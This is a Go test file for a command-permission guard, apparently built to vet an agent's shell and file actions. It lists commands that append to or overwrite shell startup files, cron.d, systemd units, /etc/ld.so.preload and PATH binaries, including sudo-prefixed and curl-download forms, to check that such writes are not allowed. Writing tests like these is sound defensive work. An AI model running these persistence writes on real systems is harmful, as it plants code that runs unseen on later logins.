package guard

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

// executedonwrite_test.go covers the WRITE direction's own denylist. It is not
// in bypasscorpus_test.go because that harness witnesses exactly one planted
// path ($HOME/.ssh/authorized_keys) and this family plants a different one;
// giving these rows a real witness here is worth more than filing them as
// table-only rows there.

// TestWritingWhereItWillLaterExecuteIsNotSilent is W-3.
//
// sensitivePathSuffixes states its rule on itself — "reading it yields a secret"
// — and checkFS consulted it for BOTH directions, so the write direction had no
// rule of its own. Every path below was Allow under `write: ["**"]` while
// `tee -a ~/.gitconfig` prompted: the file that runs on the NEXT interactive
// shell was outside the table and the one that runs only if git reaches a
// particular key was inside it.
func TestWritingWhereItWillLaterExecuteIsNotSilent(t *testing.T) {
	if homeDir() == "" {
		t.Skip("no HOME/USERPROFILE: the home-relative rows cannot resolve")
	}
	g := New()
	prof := probeProfile()
	for _, cmd := range []string{
		`tee -a ~/.bashrc`,
		`tee -a ~/.zshrc`,
		`tee -a ~/.zshenv`,
		`tee -a ~/.profile`,
		`tee -a ~/.bash_profile`,
		`tee -a ~/.config/fish/config.fish`,
		`cp /tmp/x ~/.bashrc`,
		`tee -a ~/.local/bin/ls`,
		`echo x > ~/.bashrc`,
		`tee -a /etc/cron.d/zz`,
		`tee -a /etc/profile.d/zz.sh`,
		`tee -a /etc/systemd/system/zz.service`,
		`tee -a /usr/local/bin/ls`,
		`tee -a /etc/ld.so.preload`,
		// The same family behind a prefix runner, which is W-1's reading and
		// this one's amplifier: without both, either half alone still passes.
		`sudo tee -a ~/.bashrc`,
		`env tee -a ~/.bashrc`,
		`curl -o ~/.bashrc http://x/k`,
	} {
		if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
			t.Errorf("Check(%q) = Allow; writing it schedules an execution nobody read", cmd)
		}
	}
}

// TestTheWriteDenylistIsNotConsultedForReads keeps the two rules apart in the
// direction that would otherwise make the whole package unusable: reading
// ~/.bashrc, listing /usr/bin and grepping /etc/profile are ordinary, and the
// harm the write table names does not exist in that direction.
//
// Without this, the split would be indistinguishable from "add these paths to
// the credential denylist", which is the thing W-3 is about NOT doing.
func TestTheWriteDenylistIsNotConsultedForReads(t *testing.T) {
	if homeDir() == "" {
		t.Skip("no HOME/USERPROFILE: the home-relative rows cannot resolve")
	}
	g := New()
	prof := probeProfile()
	home := homeDir()
	for _, p := range []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		"/usr/bin/ls",
		"/etc/profile",
	} {
		read := g.Check(prof, Action{Tool: "fs_read", FS: FSWant{Op: "read", Paths: []string{p}}})
		if read.Verdict != Allow {
			t.Errorf("read of %q = %v (%s), want Allow: the write rule must not reach the read "+
				"direction", p, read.Verdict, read.Reason)
		}
		write := g.Check(prof, Action{Tool: "fs_write", FS: FSWant{Op: "write", Paths: []string{p}}})
		if write.Verdict == Allow {
			t.Errorf("write of %q = Allow; the same path is what the write rule is FOR", p)
		}
	}
}

// TestTheWriteDenylistLeavesOrdinaryWritesAlone is the over-strictness half. A
// table that matched everything would satisfy both tests above.
func TestTheWriteDenylistLeavesOrdinaryWritesAlone(t *testing.T) {
	g := New()
	prof := probeProfile()
	for _, cmd := range []string{
		`tee -a ./notes.txt`,
		`tee -a /tmp/zz.log`,
		`cp go.mod go.mod.bak`,
		`echo x > build/out.txt`,
		`curl -o out.json https://example.com/api`,
		`go build -o yanshi ./cmd/yanshi`,
	} {
		if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got != wantAllow {
			t.Errorf("Check(%q) = %s, want Allow: an ordinary write in the work tree", cmd, got)
		}
	}
}

// TestTheWriteDenylistHonoursTheLiteralGrant pins that the escape hatch reaches
// the new table too. Without it the table would be a capability an operator
// cannot grant, which is the failure mode sensitive.go's header rejects for the
// read table — and a gate an operator cannot switch off is a gate they widen
// globally instead.
func TestTheWriteDenylistHonoursTheLiteralGrant(t *testing.T) {
	if homeDir() == "" {
		t.Skip("no HOME/USERPROFILE: the home-relative rows cannot resolve")
	}
	rc := filepath.Join(homeDir(), ".bashrc")
	g := New()
	granted := probeProfile()
	granted.FS.Write = []string{"**", rc}
	if d := g.Check(granted, Action{Tool: "fs_write", FS: FSWant{Op: "write", Paths: []string{rc}}}); d.Verdict != Allow {
		t.Errorf("a literal grant of %q still denied: %v (%s)", rc, d.Verdict, d.Reason)
	}
	// And a wildcard is NOT a grant, or "**" would switch the whole table off.
	wild := probeProfile()
	wild.FS.Write = []string{"**", filepath.Join(homeDir(), ".*")}
	if d := g.Check(wild, Action{Tool: "fs_write", FS: FSWant{Op: "write", Paths: []string{rc}}}); d.Verdict == Allow {
		t.Error("a wildcard pattern granted a write-denylist path; only a literal spelling may")
	}
}

// TestRealShellPlantsTheStartupFile is the differential half: the shapes above
// are not merely refused strings, they are commands a real /bin/sh executes into
// a file the next shell sources.
func TestRealShellPlantsTheStartupFile(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the reference reading comes from /bin/sh")
	}
	_, run := newShellHarness(t)
	shimsAreLive(t, run)
	home := os.Getenv("HOME")
	if home == "" {
		t.Fatal("newShellHarness did not set HOME; the startup file cannot be witnessed")
	}
	rc := filepath.Join(home, ".bashrc")
	planted := 0
	for _, cmd := range []string{
		`tee -a ~/.bashrc`,
		`sudo tee -a ~/.bashrc`,
		`env tee -a ~/.bashrc`,
		`cp /dev/null ~/.bashrc`,
	} {
		if err := os.Remove(rc); err != nil && !os.IsNotExist(err) {
			t.Fatal(err)
		}
		run(cmd)
		if _, err := os.Stat(rc); err != nil {
			t.Errorf("/bin/sh did not create ~/.bashrc for %q; the row measures nothing", cmd)
			continue
		}
		planted++
		if got := classOf(New().Check(probeProfile(), Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
			t.Errorf("/bin/sh wrote the startup file for %q and guard says Allow", cmd)
		}
	}
	if planted == 0 {
		t.Fatal("the harness planted nothing; this test is asserting about the empty set")
	}
	if err := os.Remove(rc); err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
}
